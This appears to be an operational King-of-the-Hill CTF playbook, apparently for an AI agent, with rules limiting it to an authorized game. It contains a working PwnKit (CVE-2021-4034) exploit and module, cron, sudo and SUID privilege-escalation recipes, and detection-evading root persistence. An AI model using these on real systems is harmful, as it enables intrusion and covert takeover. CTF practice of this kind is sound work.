# KotH Playbook v2 — capture, lock, hold, retake

Derived from the 2026-11-02/03 engagement post-mortem (`reports/REPORT-FINAL.md`,
`WRITEUP-SELF.md`, `WRITEUP-HUMAN.md`, `WRITEUP-ENEMY-AI.md`) and the opposing
agent's handoff (`KOTH_AI.md`). This version is **generic**: every target value
lives in `koth.conf`. Nothing below is hardcoded to one box.

Scope rules and tool inventory: read `~/.codex/CTF-TOOLS.md` first. One target
at a time, only the assigned host. Secrets in this document are placeholders —
real keys, passwords and flags never go into a playbook.

> **Core rule of v2:** *lock the vector before celebrating.* A crown on an
> unclosed entry path is a rental, not a hold. First root ≤ 3 min is easy; the
> whole game is the 60 s after it.

---

## 0. 60-second card

| Clock | Action | Exit criterion |
|---|---|---|
| 0:00–0:20 | Recon in parallel (`nmap` + checker + top web ports) | port/service map, current king |
| 0:20–1:20 | Foothold via pre-staged adapter | `id` as a low-priv user |
| 1:20–3:00 | `discover.sh` → top-ranked vector → root | `uid=0` proof file |
| 3:00–4:00 | **Lock**: stub the vector, close alternates | `backup.sh`/cron target root-owned + `+i` |
| 4:00–4:30 | King + key + sentries | checker returns our name ×3 |
| 4:30–5:00 | Verify + start retake watch | stable crown, 2 sentries, 0 enemy artifacts |

If any block overruns, do not skip the lock step. Skip the *next* optional step
instead (e.g. extra flag hunting).

---

## 1. Pre-flight kit and config

### 1.1 Kit layout

Build and test this **before** the box starts. In-game assembly costs minutes.

| Path | Contents | Purpose |
|---|---|---|
| `kit-capture/koth.conf.example` | config schema | copy → `koth.conf` |
| `kit-capture/discover.sh` | read-only vector scan | ranked root paths |
| `kit-capture/capture.sh` | orchestrator | discover → vector → root payload |
| `kit-capture/enum.sh` | one-shot host enum | users, sudo, cron, SUID, caps, ports |
| `kit-capture/restore.sh` | king + key | atomic crown restore |
| `kit-capture/lock_vector.sh` | immutable stub | closes the entry path |
| `kit-capture/guard_install.sh` | sentry deploy | units + cron + log |
| `kit-capture/writer_atomic.php` | tmp+rename loop | wins 4–8 ms races |
| `kit-capture/adapters/` | foothold + vector adapters | ssh / http_eval / upload_lfi / sudo / suid / pkexec / cron |
| `kit-guard/guard.sh` | sentry A (0.2 s) | invariants + enemy cleanup |
| `kit-guard/watch.sh` | sentry B (0.5 s) | restart A, re-assert crown/key |
| `kit-guard/install_guard.sh` | installer | systemd + cron.d + `+i` |
| `kit-retake/retake.sh` | 90 s retake driver | checker-aware, diagnosis on failure |
| `kit/pwnkit.c`, `kit/pwnkit.so` | PwnKit module | fallback root when `pkexec` is unpatched |

Pre-flight gate (local, no target contact):

```sh
cd kit-capture && for f in *.sh adapters/*.sh; do bash -n "$f" || echo "SYNTAX $f"; done
cd ../kit-guard  && for f in *.sh; do bash -n "$f" || echo "SYNTAX $f"; done
cd ../kit-retake && bash -n retake.sh
sha256sum ../kit/pwnkit.so writer_atomic.php | tee ../logs/kit.sha256
./capture.sh --config koth.conf.example --dry-run    # plan only, touches nothing
```

If `php`/`shellcheck` are missing locally, say so in the run log — do not claim
they were used.

### 1.2 `koth.conf` schema

Copy `koth.conf.example` → `koth.conf`, `chmod 600`, and edit. The file is
**sourced by bash**: treat it as code, root-owned on the target.

| Variable | Required | Meaning | Example |
|---|---|---|---|
| `TARGET` | yes | SSH destination / host under test | `<TARGET>` |
| `CHECKER_URL` | yes | Public king endpoint | `http://<TARGET>:9999/` |
| `EXPECT_KING` | yes | Exact king bytes, **no trailing newline** | `<your-thm-username>` |
| `STAGE_DIR` | yes | Low-priv-writable staging dir, not `/tmp` | `/dev/shm/.koth-stage` |
| `FOOTHOLD_CMD` | yes | Template that runs one command as low-priv; `{CMD}` substituted | `ssh -p 22 lowpriv@<TARGET> -- {CMD}` |
| `ROOT_CRON_TARGET` | yes* | Root-executed writable file found by discovery | `/home/serv3/backups/backup.sh` |
| `OUR_PUBKEY` | yes | Public key installed for root | `$HOME/.ssh/koth.pub` |
| `ENEMY_PATTERNS` | yes | Substrings of hostile command lines (guard array) | `(kothguard koth_detector)` |

\* Required for the cron vector; other vectors use `SUDO_EXPLOIT_CMD`,
`SUID_EXPLOIT_CMD`, `PKEXEC_EXPLOIT_CMD` instead.

Working config:

```bash
# ---- identity -------------------------------------------------------------
TARGET="${TARGET:-<TARGET>}"
CHECKER_URL="${CHECKER_URL:-http://${TARGET}:9999/}"
EXPECT_KING="${EXPECT_KING:-<your-thm-username>}"   # exact bytes, no newline
KING_FILE="${KING_FILE:-/root/king.txt}"
AUTH_KEYS="${AUTH_KEYS:-/root/.ssh/authorized_keys}"

# ---- staging --------------------------------------------------------------
STAGE_DIR="${STAGE_DIR:-/dev/shm/.koth-stage}"      # NOT /tmp: enemies clean it
WORK_DIR="${WORK_DIR:-$(pwd)/.work}"                # local only

# ---- foothold -------------------------------------------------------------
FOOTHOLD_ADAPTER="${FOOTHOLD_ADAPTER:-template}"    # template|ssh|http_eval|upload_lfi
FOOTHOLD_CMD="${FOOTHOLD_CMD:-ssh -p 22 lowpriv@${TARGET} -- {CMD}}"
# http_eval adapter:
#   FOOTHOLD_URL="http://${TARGET}:8002/trycode"    # POST code=... -> serv user
# upload_lfi adapter:
#   UPLOAD_URL="http://${TARGET}:8001/support.php"
#   LFI_URL="http://${TARGET}/?page=uploads/{FILE}"

# ---- root vector ----------------------------------------------------------
ROOT_CRON_TARGET="${ROOT_CRON_TARGET:-}"            # filled from discover.sh
ROOT_CRON_STUB="${ROOT_CRON_STUB:-/usr/local/sbin/.sysmon-boot}"
ROOT_CRON_SCHEDULE="${ROOT_CRON_SCHEDULE:-* * * * *}"
SUDO_EXPLOIT_CMD="${SUDO_EXPLOIT_CMD:-}"            # e.g. sudo -n /usr/bin/env bash -c {CMD}
SUID_EXPLOIT_CMD="${SUID_EXPLOIT_CMD:-}"
PKEXEC_EXPLOIT_CMD="${PKEXEC_EXPLOIT_CMD:-}"

# ---- key ------------------------------------------------------------------
OUR_PUBKEY="${OUR_PUBKEY:-$HOME/.ssh/koth.pub}"
OUR_IDENTITY="${OUR_IDENTITY:-$HOME/.ssh/koth}"

# ---- defence --------------------------------------------------------------
INSTALL_DIR="${INSTALL_DIR:-/usr/local/sbin}"
SENTRY_NAMES=(.sysmon .svcwatch)                    # neutral, see §4.1
LOG_FILE="${LOG_FILE:-/root/.sysmon.log}"
STATE_DIR="${STATE_DIR:-/run/koth}"
GUARD_INTERVAL="${GUARD_INTERVAL:-0.2}"
WATCH_INTERVAL="${WATCH_INTERVAL:-0.5}"
LOG_MAX_BYTES="${LOG_MAX_BYTES:-2097152}"
ENEMY_PATTERNS=(kothguard koth_detector)
ENEMY_ARTIFACTS=(/etc/cron.d/kothguard /usr/local/bin/.kothguard \
                 /etc/systemd/system/kothguard.service)
ENEMY_SERVICES=(kothguard.service)
ENEMY_SUDOERS=(/etc/sudoers.d/serv2)
WAIT_SECS="${WAIT_SECS:-90}"
```

Notes that cost time in the field:

- `EXPECT_KING` is byte-exact. `printf '%s'` (no `\n`). Verify with `wc -c` and
  `xxd`; a 13-byte name written with a newline fails the checker silently.
- `ENEMY_PATTERNS` entries are auto-escaped/bracket-ified by `guard.sh`, so a
  literal entry can never match its own command line. Do **not** add `king.txt`
  on a box where operators `cat /root/king.txt` — it self-triggers.
- Keep `STAGE_DIR` off `/tmp`; opponents purge `/tmp` first.
- Never commit `koth.conf` or keys. Redact keys, passwords, cookies and flags
  from every report.

---

## 2. Generic vector discovery

### 2.1 One-shot enumeration

Run as the low-priv foothold user. `discover.sh` is read-only and prints
`rank|vector|path|why|est_time_sec` plus a JSON block.

```sh
# through the kit: dry-run plans only, real run uploads and executes discover.sh
./capture.sh --config koth.conf --dry-run
./capture.sh --config koth.conf              # auto-picks the top-ranked vector
./capture.sh --config koth.conf --vector cron

# manual equivalent
id; hostname; uname -a
sudo -n -l 2>&1
cat /etc/crontab; ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly
ls -la /etc/sudoers.d; cat /etc/sudoers.d/* 2>/dev/null
find / -xdev \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null
getcap -r / 2>/dev/null
printf '%s\n' "$PATH" | tr ':' '\n' | while read -r d; do [ -w "$d" ] && echo "WRITABLE PATH $d"; done
systemctl list-timers --all 2>/dev/null; systemctl list-unit-files 2>/dev/null | head -50
ps -eo user,pid,ppid,etimes,args --sort=start_time | grep -Ei 'guard|king|koth|\.sh' | grep -v grep
ls -la /root/king.txt 2>&1; lsattr /root/king.txt 2>&1
ss -tlnp 2>/dev/null
```

### 2.2 What each check actually means

| Check | Command | Root path if… |
|---|---|---|
| sudo NOPASSWD / SETENV | `sudo -n -l` | rule names a shell-capable binary, a script, or allows `SETENV`/`env` |
| writable root cron file | `cat /etc/crontab`, `ls -la /etc/cron.d/*` | file **or its parent dir** is writable by you |
| writable cron *command* | parse cron lines for absolute paths | the referenced script is writable |
| systemd unit/timer | `systemctl cat <u>`, `ls -la /etc/systemd/system` | unit file writable, or `ExecStart` target writable |
| SUID/SGID | `find / -xdev -perm -4000 -o -perm -2000` | dangerous name (`bash`, `find`, `cp`, `vim`, `tar`, `nmap`, `python`) |
| capabilities | `getcap -r /` | `cap_setuid`, `cap_setgid`, `cap_dac_override`, `cap_sys_admin` |
| writable PATH dir | `[ -w "$d" ]` for each `$PATH` entry | a root script calls a binary by bare name |
| pkexec | `pkexec --version`, `dpkg -l policykit-1` | SUID and version `< 0.105-20ubuntu0.18.04.5`-equivalent patch |

### 2.3 Ranked decision table

Pick the **fastest**, not the most interesting. Times are from the post-mortem
and the kit's own estimates.

| Rank | Vector | Precondition | Skeleton | Est. | Win odds | Risk |
|---|---|---|---|---|---|---|
| 1 | `sudo_setenv` | NOPASSWD+SETENV on a script that calls a bare-name binary | `sudo -n PATH=/dev/shm/.s /usr/bin/<script>` | **5–10 s** | high | fork storm if payload re-enters itself |
| 2 | `suid` (shell) | SUID `bash`/`sh`/`cp` copy you can execute | `/path/bash -p -c 'id'` | **5 s** | high | none |
| 3 | `caps` | `cap_setuid=ep` on an interpreter/tool | `setpriv`/GTFOBins one-liner | **10 s** | medium-high | none |
| 4 | `suid` (generic) | SUID `find`/`vim`/`tar`/`nmap`/`python` | GTFOBins `-exec` / `:!` / `--eval` | **10–20 s** | medium | none |
| 5 | `pkexec` | SUID `pkexec`, package unpatched | PwnKit (§6) | **15–40 s** | high if unpatched | crash of one process only |
| 6 | `systemd_timer` | writable unit or `ExecStart` target | overwrite unit/script, `daemon-reload`, wait | **20–60 s** | medium | unit may be immutable |
| 7 | `path` | writable dir in root's `PATH` | drop bare-name binary, wait for root call | **30 s** | low-medium | only if a root job uses bare names |
| 8 | `cron` | root cron runs a file you can write | stub + atomic writer, wait for `:00` | **≤ 60 s** | high, but a race | enemy rewriter |
| 9 | kernel LPE | nothing else | CVE-specific | **5–20 min** | low | box panic, DoS — **last resort** |

Selection rules:

1. **60 s per vector, hard cap.** If it has not fired, move on; run the next
   vector in parallel if it is non-destructive.
2. While waiting for cron (`:00`), keep testing sudo/SUID. Waiting is idle time.
3. Prefer the vector that leaves a **file you can make immutable** over one that
   needs a live process. Immutable files survive enemy restarts; processes do not.
4. Kernel exploits only when no userspace vector exists, and never on a box
   whose services must stay up.
5. Record `rank|vector|path|why|eta` in the run log — the retake uses the same
   ranking.

---

## 3. Capture sequence — lock the vector before celebrating

This is the ordering that v1 got wrong for ~40 minutes. Do it exactly.

| Step | Budget | Action | Done when |
|---|---|---|---|
| 0 | 0 s | Prove root: `id > /root/.proof` | file contains `uid=0` |
| 1 | +5 s | **Close the entry path**: root-owned immutable stub | target is `root:root 755`, `+i` |
| 2 | +10 s | Remove alternate entries: `sudoers.d`, SUID copies, stray keys | `sudo -n -l` clean, no foreign SUID |
| 3 | +5 s | Write king + key (atomic) | checker returns our name |
| 4 | +20 s | Install 2 sentries + systemd + cron | 2 PIDs, units active |
| 5 | +10 s | Verify everything | §8.5 checklist green |

### 3.1 Step 0 — root proof

```sh
id > /root/.proof 2>&1; cat /root/.proof
```

Never trust an exploit's exit code. A "successful" run that did not write
`uid=0` is a failure; re-check with an independent command.

### 3.2 Step 1 — lock the vector (the 60-second rule)

Replace the root-executed writable file with a **root-owned immutable stub**
that execs the sentry. This converts "anyone with serv3 becomes root every
minute" into "only a live root process can take the box".

```sh
T=/home/serv3/backups/backup.sh        # ROOT_CRON_TARGET
STUB=/usr/local/sbin/.sysmon-boot      # ROOT_CRON_STUB

# 0) create the stub FIRST so cron never points at a missing file
printf '#!/bin/bash\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n[ -x /usr/local/sbin/.sysmon ] && exec /usr/local/sbin/.sysmon\nexit 0\n' > "$STUB"
chown root:root "$STUB"; chmod 700 "$STUB"; chattr +i "$STUB"

# 1) atomically replace the entry path
chattr -i "$T" 2>/dev/null
printf '#!/bin/bash\nexec %s "$@"\n' "$STUB" > "$T.tmp.$$"
chown root:root "$T.tmp.$$"; chmod 755 "$T.tmp.$$"
mv -f "$T.tmp.$$" "$T"
chown root:root "$T"; chmod 755 "$T"
chattr +i "$T"
# evidence
stat -c '%n %U:%G %a %s' "$T"; lsattr "$T"; cat "$T"
```

`lock_vector.sh <target> <stub>` does this, including the atomic `mv`.

Why it works: `serv3` cannot write a `root:root` file, and cannot clear `+i`
without `CAP_LINUX_IMMUTABLE`. An enemy `mv -f` over it fails with `EPERM`.
**This is the single highest-value action in the whole playbook.**

### 3.3 Step 2 — close alternate entries

Order matters less than doing it inside the first minute.

```sh
# sudo drop-ins that give a low-priv user a root path
rm -f /etc/sudoers.d/serv2
visudo -c >/dev/null 2>&1 || echo "SUDOERS BROKEN - fix now"

# SUID copies dropped by either side
for f in /home/serv3/.rs /home/serv3/.rs2 /tmp/rootbash; do
  [ -e "$f" ] && { chattr -i "$f" 2>/dev/null; rm -f "$f"; }
done
find / -xdev -perm -4000 -type f -newermt '-2 hours' 2>/dev/null

# stray authorized keys (fair-play: see §7.5 before evicting)
cat /root/.ssh/authorized_keys

# enemy persistence
systemctl stop kothguard 2>/dev/null; systemctl disable --now kothguard 2>/dev/null
rm -f /etc/cron.d/kothguard /usr/local/bin/.kothguard \
      /etc/systemd/system/kothguard.service
systemctl daemon-reload
```

Fortification note: closing a root path you used (or one that trivially grants
root) is standard KotH fortification and allowed on THM. Some private
engagements forbid "fully closing" the box — check the engagement rules. Never
patch application source, disable services, or change credentials either way
(§7.1).

### 3.4 Step 3 — king + key

`restore.sh` does this atomically and prints `xxd`/`lsattr` evidence.

```sh
chattr -i /root/king.txt 2>/dev/null
printf '%s' '<your-thm-username>' > /root/king.txt    # NO newline
chattr +i /root/king.txt
install -d -m 700 /root/.ssh
grep -qxF "$(cat "$OUR_PUBKEY")" /root/.ssh/authorized_keys 2>/dev/null \
  || cat "$OUR_PUBKEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
curl -s "$CHECKER_URL"        # must equal EXPECT_KING
```

### 3.5 Step 4 — sentries

`guard_install.sh --config koth.conf` (see §4). Do not hand-roll this in-game.

### 3.6 Anti-patterns (each one cost time in v1)

| Anti-pattern | Consequence | Fix |
|---|---|---|
| `chmod 4755` before `chown root:root` | `chown` clears SUID; vector looks dead | `cp → chown → chmod` |
| Staging in `/tmp` | enemy wipes it; payload vanishes | `STAGE_DIR=/dev/shm/...` or the app's own dir |
| Non-atomic `>` into a cron file | cron reads half a file, syntax error | tmp + `rename` |
| Killing by literal name | `pkill -f kothguard` kills your own SSH | bracket pattern (§4.5) |
| Celebrating at first root | 40 min of ping-pong | lock first (§3.2) |
| `sudo PATH=/tmp` + bare `systemctl` in payload | payload calls itself → fork storm | `export PATH=...` first line, absolute paths |

---

## 4. Sentry design

### 4.1 Naming

Neutral names are a **security control**, not cosmetics. In v1 the sentries were
`.hillboot/.hillguard/.hillwatch`, which were literally in the enemy's kill
list, and they died within 0.2 s of every capture.

Rules:

- No `koth`, `king`, `guard`, `watch`, `hill`, `pwn`, `shell`, `backdoor`.
- Use generic service-sounding names: `.sysmon`, `.svcwatch`, `.svcd`,
  `.healthd`, `.unitcheck`. Leading dot is fine but not sufficient.
- Vary from the previous engagement; assume the opponent has your old playbook.
- File mode `700`, root-owned, `chattr +i`.
- Never put the king value or key comment in the filename.

### 4.2 Two-loop architecture

| Sentry | Path | Interval | Job |
|---|---|---|---|
| A | `$INSTALL_DIR/.sysmon` | **0.2 s** | king, key, cron stub, enemy pattern cleanup, log |
| B | `$INSTALL_DIR/.svcwatch` | **0.5 s** | restart A if dead, re-assert king/key independently |

Two loops, not one: B covers A's death; both cover each other's blind spot. A
0.2 s loop is enough against a human and against a 200 ms guard, but **not**
against a 4–8 ms atomic writer — that is what §5 is for.

### 4.3 Persistence: systemd + cron fallback

Install all three, in this order:

1. **systemd unit** (primary, `Restart=always`):

```ini
[Unit]
Description=System monitor
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash /usr/local/sbin/.sysmon
Restart=always
RestartSec=1

[Install]
WantedBy=multi-user.target
```

```sh
systemctl daemon-reload
systemctl enable --now sysmon.service
```

2. **`/etc/cron.d/<name>`** (fallback, 600 root:root, `+i`):

```cron
* * * * * root pgrep -f '/usr/local/sbin/[.]sysmon' >/dev/null 2>&1 || setsid /bin/bash /usr/local/sbin/.sysmon >/dev/null 2>&1
```

The `pgrep || setsid` guard prevents a second copy every minute. The bracket in
`[.]sysmon` keeps the cron line from matching itself.

3. **Root cron stub** — if you own a root-executed file (the vector you locked),
   its stub should `exec` sentry A. That turns the enemy's own favorite vector
   into your re-arm path.

```sh
chattr -i "$ROOT_CRON_TARGET" 2>/dev/null
printf '#!/bin/bash\nexec /usr/local/sbin/.sysmon "$@"\n' > "$ROOT_CRON_TARGET"
chown root:root "$ROOT_CRON_TARGET"; chmod 755 "$ROOT_CRON_TARGET"; chattr +i "$ROOT_CRON_TARGET"
```

Verify all three paths independently: `systemctl is-active`, `crontab -l`/`cat
/etc/cron.d/*`, and wait one minute to see the stub fire (write a `.ran` marker
with `id -u`).

### 4.4 Append-only log

```sh
: > /root/.sysmon.log
chmod 600 /root/.sysmon.log
chattr +a /root/.sysmon.log        # append-only: even root must clear +a to truncate
```

Log one line per event: UTC timestamp, event, old value, attrs, PID. Never log
the key body or full flags. The watchdog rotates by copy+truncate only after
`chattr -a`, when the file exceeds `LOG_MAX_BYTES`.

### 4.5 Bracket `pkill` patterns

A literal `pkill -f kothguard` matches the shell that is running the command
(its own cmdline contains the word). That killed our own session at least three
times. Always bracket one character:

```sh
pkill -9 -f 'koth[g]uard'          # matches "kothguard", not "koth[g]uard"
pkill -9 -f 'koth_[d]etector'
pkill -9 -f '/usr/local/sbin/[.]svcwatch'
```

Helper for generated patterns:

```sh
bracket() {  # kothguard -> koth[g]uard
  local s=$1
  [ ${#s} -ge 3 ] || { printf '%s' "$s"; return; }
  printf '%s[%s]%s' "${s:0:1}" "${s:1:1}" "${s:2}"
}
```

Also exclude self and parent explicitly in loops:

```sh
ps -eo pid=,ppid=,args= | awk -v me=$$ -v pp=$PPID '$1!=me && $1!=pp'
```

Never `pkill -f bash`, `pkill -f python`, `pkill -f php` — that is both a
self-kill and an automated-kill rules violation.

### 4.6 Guard invariants and hard limits

The guard may only: restore the crown, maintain **our own** key (append-only),
re-install itself, restore the stub, log. It must **not**:

- kill processes by broad class (`bash`, `php`, `python`, all `ppid=1` shells);
- delete other players' files or evict their keys continuously;
- stop/disable services, patch app code, change passwords or `sshd_config`;
- touch the checker, scoring service, or flags.

Those are compliance violations (§7) and they escalate the arms race.

### 4.7 Idempotent install

`guard_install.sh` must be safe to run twice: check `systemctl is-active`
before start, `cmp -s` before copying, `grep -qF` before appending a key,
`lsattr | grep -q i` before `chattr +i`. A non-idempotent installer is how you
end up with three sentries and a fork storm.

---

## 5. Atomic writer and generator hunting

### 5.1 Why tmp + `rename`

Cron/`ExecStart` read the whole file. A plain `>` exposes a partial file and a
syntax error; `rename(2)` on the same filesystem is atomic, so the reader sees
either the old or the new complete file, never a mix.

### 5.2 Writer

```sh
# php writer_atomic.php <target> <payload-file> [interval_ms]
nohup setsid php /dev/shm/.koth-stage/writer_atomic.php \
  /home/serv3/backups/backup.sh /dev/shm/.koth-stage/payload.sh 4 \
  >/dev/null 2>&1 &
echo $! > /dev/shm/.koth-stage/.koth-wr.pid
```

Equivalent one-liner (no kit file):

```sh
nohup setsid php -r 'while(true){
  $c=file_get_contents("/dev/shm/.koth-stage/payload.sh");
  $t="/home/serv3/backups/.b.tmp";
  @file_put_contents($t,$c);
  @rename($t,"/home/serv3/backups/backup.sh");
  usleep(4000);
}' >/dev/null 2>&1 &
```

Interpreter choice: PHP if present, then Perl, then Python3, then `/bin/sh`.
Avoid a name the enemy kills (`.sh` loops are prime targets); `php -r` survived
in v1 because it was not in the enemy's kill list.

### 5.3 Interval math

| Interval | Iterations/min | Beats | Notes |
|---|---|---|---|
| 200 ms | 300 | human edits, slow guards | enemy guard default |
| 20 ms | 3000 | 200 ms guard | |
| **4–8 ms** | 7 500–15 000 | an 8 ms enemy writer (≈ coin flip; phase decides) | v1 winning setting |
| 1 ms | 60 000 | almost anything | CPU burn; DoS risk — avoid |

4–8 ms is the sweet spot: enough to beat a same-speed rewriter often, cheap
enough not to load the box. Going to 1 ms is resource exhaustion and a
compliance problem.

Timing rule: if `:00` is **> 20 s away**, write normally. If **< 20 s**, start
the 4 ms writer immediately — the window is too short for a single write to
survive an enemy guard.

### 5.4 Failure modes

| Symptom | Cause | Fix |
|---|---|---|
| cron reads partial file | non-atomic write | tmp + `rename` |
| `rename` fails every time | target immutable (`+i`) | stop; use another vector |
| payload disappears | staged in `/tmp`, enemy cleaned it | `STAGE_DIR` on `/dev/shm` or app dir |
| writer dies silently | killed by name, or interpreter missing | neutral name; check `ps -p $(cat pidfile)` |
| writer alive, cron never fires | cron line removed/changed | re-read `/etc/crontab`; re-add if allowed |
| win then lose in <1 s | enemy guard faster than cron | kill the generator, then lock |

### 5.5 Hunt the generator, not the file

v1 spent ~21 minutes rewriting `backup.sh` while the enemy's `.w2` PHP loop
rewrote it every 8 ms. Rewriting the file cannot beat the process that rewrites
it. Find and stop the **process**.

```sh
T=/home/serv3/backups/backup.sh
# who references the target?
ps -eo pid,ppid,user,etimes,args | grep -F -- "$T" | grep -v grep
# who has it open?
command -v fuser >/dev/null && fuser -v -- "$T"
lsof -- "$T" 2>/dev/null
# who is writing nearby? (temp siblings, loops, interpreters)
ls -la "$(dirname "$T")" | grep -E '\.tmp|\.w[0-9]|\.b\.'
ps -eo pid,ppid,user,args | grep -E 'file_put_contents|rename\(|while\(true\)|usleep' | grep -v grep
# cwd/exe of suspects
for p in <pid>; do readlink /proc/$p/cwd; readlink /proc/$p/exe; done
```

Then, in this order:

1. `kill -9 <pid>` the writer (specific PID, not a class).
2. Remove its payload/script (`chattr -i` first if needed).
3. Remove its persistence (cron/unit) **if it is the enemy's**, not a service.
4. Re-lock the target as root-owned immutable (§3.2).
5. Only then restore king/key.

If `kill` is not permitted by the engagement rules (fair-play games), do not
kill: make the target immutable instead, which is allowed fortification and
wins permanently. That is exactly what ended v1.

### 5.6 Immutable target = stop

`lsattr "$T" | grep -q i` → the writable vector is closed. Do not loop. Switch
to a different root path (`discover.sh` again) or use a live root process.
Continuing to write is wasted time and looks like a DoS.

---

## 6. PwnKit — CVE-2021-4034 (working recipe)

Use when: SUID `pkexec` exists, the package is unpatched, and no faster vector
is available. This is the exact shape that worked in the enemy handoff.

### 6.1 Preconditions

```sh
ls -la /usr/bin/pkexec
pkexec --version 2>&1 | head -2
dpkg -l policykit-1 2>/dev/null | tail -1     # patched at 0.105-20ubuntu0.18.04.5
```

If the version is at/above the patched build, skip PwnKit — do not conclude
"patched" from a single failed run; check `argv[0]`/env and the package version
separately (v1 wasted ~5 min on a malformed attempt).

### 6.2 Exact argv/env shape

The exploit relies on `pkexec` reading `argv[1]` when `argc == 0`; with
`args = { NULL }`, that read lands on `envp[0]`, so `envp[0]` becomes the gconv
path. The first env entry must therefore be the path string, and the rest set
up `GCONV_PATH` and the charset.

```text
args = { NULL }
envp = { "pwnkit.so:.",
         "PATH=GCONV_PATH=.",
         "SHELL=<must not exist>",
         "CHARSET=PWNKIT",
         "GIO_USE_VFS=",
         NULL }
cwd  = directory containing "GCONV_PATH=."/
```

```c
#include <unistd.h>

int main(void) {
    char * const args[] = { NULL };              /* argc == 0 */
    char * const environ[] = {
        "pwnkit.so:.",                           /* becomes argv[1] via OOB read */
        "PATH=GCONV_PATH=.",                     /* GCONV_PATH resolves to "GCONV_PATH=." */
        "SHELL=/lol/i/do/not/exists",            /* must not exist */
        "CHARSET=PWNKIT",                        /* triggers the module load */
        "GIO_USE_VFS=",
        NULL
    };
    return execve("/usr/bin/pkexec", args, environ);
}
```

Non-negotiable details:

- `args` has exactly one element, `NULL` (not `argv[0]`).
- `environ[0]` is the path string, **not** `KEY=VALUE`.
- `SHELL` must point to a non-existent file (pkexec refuses if it exists).
- `CHARSET=PWNKIT` must match the module name in `gconv-modules`.

### 6.3 Directory layout

Everything relative to the working directory (`cd` into it first):

| Path | Type | Content |
|---|---|---|
| `./cve` | ELF executable | launcher above |
| `./pwnkit.so` | shared object | constructor calls `setuid(0); setgid(0); system(...)` |
| `./GCONV_PATH=./gconv-modules` | file | `module UTF-8// PWNKIT// pwnkit 1` |
| `./GCONV_PATH=./pwnkit.so` | file | the malicious module (copy) |
| `./GCONV_PATH=./pwnkit.so:.` | file | executable copy of `/bin/true` (loader probe) |
| `./root.sh` | script | root payload |

```sh
mkdir -p /dev/shm/.x && cd /dev/shm/.x
# stage cve, pwnkit.so, gconv-modules, root.sh from the kit
mkdir -p 'GCONV_PATH=.'
cp -f pwnkit.so 'GCONV_PATH=./pwnkit.so'
printf 'module UTF-8// PWNKIT// pwnkit 1\n' > 'GCONV_PATH=./gconv-modules'
cp -f /bin/true 'GCONV_PATH=./pwnkit.so:.'
chmod 755 cve root.sh 'GCONV_PATH=./pwnkit.so:.'
./cve
```

The `GCONV_PATH=./pwnkit.so:.` dummy is required: the loader probes that path
before `dlopen`-ing the module. Without it the load fails even though
`gconv-modules` is correct. Treat the layout as empirical — copy it exactly.

### 6.4 Module

```c
#include <stdlib.h>
#include <unistd.h>

void gconv(void) {}
void gconv_init(void *step) {
    setuid(0); setgid(0);
    /* absolute paths only: the gconv environment has a minimal PATH */
    system("/bin/bash /dev/shm/.x/root.sh >/dev/shm/.x/root.log 2>&1");
    _exit(0);
}
```

### 6.5 Why `touch` failed

The enemy's module ran:

```c
system("touch /tmp/x/so_loaded; /bin/bash /tmp/x/root.sh >/tmp/x/root.log 2>&1");
```

and their log contained `sh: touch: not found`. Inside the gconv load the
environment is minimal (the `PATH` was replaced by `GCONV_PATH=.`), so a bare
`touch` cannot be resolved. `root.sh` still ran because it used an absolute
`/bin/bash`. Their "failure" was cosmetic — but v1 misread a similar error as
"PwnKit patched".

Fixes, in order of preference:

1. Use absolute paths for every binary: `/usr/bin/touch`, `/bin/bash`, `/bin/cp`.
2. Or `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
   as the first line of `root.sh`.
3. Or drop the marker entirely; verify root via `id` written by `root.sh`.

### 6.6 Run and verify

```sh
cd /dev/shm/.x && ./cve
cat /dev/shm/.x/root.log          # must contain uid=0
ls -la /root/.proof               # independent proof
```

`./cve` returns quickly and may print nothing; the proof is the root payload's
output, not the launcher's exit status.

### 6.7 Pitfalls checklist

- [ ] Ran from the directory containing `GCONV_PATH=.` (relative paths).
- [ ] `args = { NULL }`, `environ[0] = "pwnkit.so:."`.
- [ ] `SHELL` points to a non-existent path.
- [ ] `gconv-modules` says `PWNKIT`, `CHARSET=PWNKIT`.
- [ ] Dummy `GCONV_PATH=./pwnkit.so:.` exists and is executable.
- [ ] `root.sh` uses absolute paths / exports `PATH`.
- [ ] Verified with `id`, not with the launcher's output.
- [ ] Cleaned up `/dev/shm/.x` after use (it is an IOC and a giveaway).

### 6.8 Cleanup

```sh
chattr -i /dev/shm/.x/* 2>/dev/null
rm -rf /dev/shm/.x
find /tmp /var/tmp /dev/shm -maxdepth 3 \( -name 'pwnkit.so' -o -name 'GCONV_PATH=*' -o -name 'cve' \) 2>/dev/null
```

---

## 7. Compliance

Authorized CTF only. The rules are part of the engagement, not obstacles.

### 7.1 Hard rules

| Rule | Allowed | Forbidden |
|---|---|---|
| Reset | — | `reset`, reboot, snapshot revert, killing the box |
| Scoring service | read the checker | modify/restart/patch `:9999`, `king.service`, `/usr/bin/koth`, checker config |
| Availability | keep services up | fork bombs, `while true` at 1 ms, memory/CPU exhaustion, mass kills |
| App code | use the vuln | patch/disable the vulnerable app, remove the upload endpoint |
| Accounts | use your key | change root password, edit `sshd_config`, disable password auth |
| Services | — | stop/disable/mask system services (apache, ssh, mysql, cron) |
| Firewall | — | add rules, block the checker or other players |
| Flags | read them | move/delete/alter flag files |
| Scope | assigned host only | scan/attack any other IP, including the opponent's VPN IP |

### 7.2 No reset, ever

A reset wipes everyone's work, including yours, and is an instant disqualifier
on most platforms. If the box is unstable because of your action, fix it in
place: kill your own runaway processes, restart the service you broke, verify
the ports.

### 7.3 Do not touch the scoring path

The checker (`:9999`) and its service are read-only for you. You may `curl` it
as often as you like; you may not restart, patch, replace its binary, or edit
its unit. Same for `/root/king.txt` semantics: write the value, do not replace
the mechanism.

### 7.4 No DoS / resource exhaustion

The v1 fork storm is the cautionary tale: `sudo PATH=/tmp` plus a bare
`systemctl` in the payload made the fake `systemctl` call itself recursively.
Load hit ~23, Apache stopped answering for 1–2 minutes. It was accidental, but
it is still a resource-exhaustion violation.

Prevention, every payload:

```sh
#!/bin/bash
